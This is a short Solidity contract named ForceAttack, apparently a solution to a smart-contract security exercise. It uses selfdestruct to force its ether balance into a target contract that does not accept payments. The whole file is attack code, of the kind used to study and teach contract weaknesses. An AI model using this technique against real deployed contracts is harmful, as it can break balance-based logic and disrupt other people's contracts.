// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ForceAttack {

  constructor() payable public {
  }

  function attack(address payable _forceAddress) public {
    selfdestruct(_forceAddress);
  }
}